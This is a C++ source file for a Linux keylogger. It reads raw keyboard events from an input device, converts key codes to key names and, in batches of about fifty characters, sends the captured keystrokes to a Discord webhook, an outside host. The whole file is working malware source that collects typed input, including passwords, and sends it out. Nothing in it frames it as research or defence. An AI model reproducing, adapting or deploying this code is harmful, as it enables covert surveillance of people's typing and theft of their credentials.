#include <linux/input.h>
#include <signal.h>
#include <iostream>
#include <string>
#include <dpp/dpp.h>
#include "keylogger.hpp"

#define NUM_KEYCODES 71

//array of key names
const char *keycodes[] = {
    "RSRVD",
    "ESC",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "0",
    "-",
    "=",
    "BACKSP",

    "TAB",
    "Q",
    "W",
    "E",
    "R",
    "T",
    "Y",
    "U",
    "I",
    "O",
    "P",
    "[",
    "]",
    "ENTER",

    "LCTRL",
    "A",
    "S",
    "D",
    "F",
    "G",
    "H",
    "J",
    "K",
    "L",
    ";",
    "'",
    "`",

    "LSHIFT",
    "\\",
    "Z",
    "X",
    "C",
    "V",
    "B",
    "N",
    "M",
    "COMMA",
    ".",
    "/",
    "RSHIFT",

    "KPASTERISK",
    "LALT",
    "SPACE",
    "CAPLK",
    "F1",
    "F2",
    "F3",
    "F4",
    "F5",
    "F6",
    "F7",
    "F8",
    "F9",
    "F10",

    "NMLK",
    "SCRLK",
    "KP7",
    "KP8",
    "KP9",
    "KP-",
    "KP4",
    "KP5",
    "KP6",
    "KP+",
    "KP1",
    "KP2",
    "KP3",
    "KP0",
    "KP.",
    "ZENKAKUHANKAKU",
    "102ND",
    "F11",
    "F12",
    "RO",
    "KATAKANA",
    "HIRAGANA",
    "HENKAN",
    "KATAKANAHIRAGANA",
    "MUHENKAN",
    "KP、",
    "KPENTR",
    "RCTRL",
    "KP\\",
    "SYSRQ",
    "RALT",
    "LNFEED",
    "HOME",
    "UP",
    "PGUP",
    "LEFT",
    "RIGHT",
    "END",
    "DOWN",
    "PGDOWN",
    "INS",
    "DEL"
};


int loop = 1;

//function handling interrupts
void sigint_handler(int sig){
    loop = 0;
}

//mainn keylogging function
void keylogger(int keyboard_file_descriptor, dpp::cluster& discord_bot, dpp::webhook& keylog_discord_webhook, int discord_keyboard_number){
    int eventSize = sizeof(struct input_event);
    int bytesRead = 0;
    struct input_event events[NUM_EVENTS];
    int i;
    
    //set keyboard identifier with keyboard number, create buffer
    std::string discord_keyboard_identifier = "Keyboard :";
    discord_keyboard_identifier.insert(9,std::to_string(discord_keyboard_number));
    std::string discord_to_send_buffer = "";

    //set interrupt handler
    signal(SIGINT, sigint_handler);

    //while loop executed until interrupted 
    while(loop){
        //read events
        bytesRead = read(keyboard_file_descriptor, events, eventSize * NUM_EVENTS);

    //add key name to buffer, if key code is outside the array, add the key code to buffer
        for(i = 0; i < (bytesRead / eventSize); ++i){
            if((events[i].type == EV_KEY) && (events[i].value == 1)){
                if(events[i].code > 0 && events[i].code < NUM_KEYCODES){
                    discord_to_send_buffer += keycodes[events[i].code];
                    discord_to_send_buffer += ", ";
                }
                else{
                    discord_to_send_buffer+= std::to_string(events[i].code);
                    discord_to_send_buffer += ", ";
                }
            }
        }

        //if more than 50 elements in buffer, send message
        if (discord_to_send_buffer.length()>=50)
        {
            discord_bot.execute_webhook_sync(keylog_discord_webhook, dpp::message(discord_keyboard_identifier+discord_to_send_buffer));
            discord_to_send_buffer = "";
        }
    }
    //send remaining key strokes from buffer, before returning
    discord_bot.execute_webhook_sync(keylog_discord_webhook, dpp::message(discord_keyboard_identifier+discord_to_send_buffer));
    close(keyboard_file_descriptor);
}